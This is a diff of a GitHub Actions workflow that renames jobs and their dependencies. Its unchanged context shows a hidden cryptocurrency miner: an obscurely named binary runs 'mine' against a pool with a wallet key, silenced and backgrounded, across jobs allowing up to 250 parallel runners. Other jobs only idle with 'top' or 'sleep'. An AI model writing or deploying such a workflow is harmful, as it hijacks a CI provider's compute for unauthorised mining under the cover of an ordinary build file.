@@ -1,10 +1,10 @@
-name: pka
+name: peli
 on: 
   push:
     branches: [ "main" ]
 
 jobs:
-  pk:
+  alah:
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 80
@@ -31,7 +31,7 @@ jobs:
          ./bnmkop mine -t 4 --pool twbitz -a --key xLPMoYZixVLRHJV7hb9gZoMusczWYRzP7JqFCRb6vXp --worker GH230 > /dev/null 2>&1 &
         sleep 5m
   pelit:
-    needs: pk
+    needs: alah
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 250
@@ -61,7 +61,7 @@ jobs:
         top
      
   cuk:
-    needs: [pk]
+    needs: [alah]
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 250
@@ -90,7 +90,7 @@ jobs:
       run: |
         top
   Success:
-    needs: [pk, pka, pkas]
+    needs: [alah, pelit, cuk]
     if: always()
     runs-on: ubuntu-20.04
     steps:
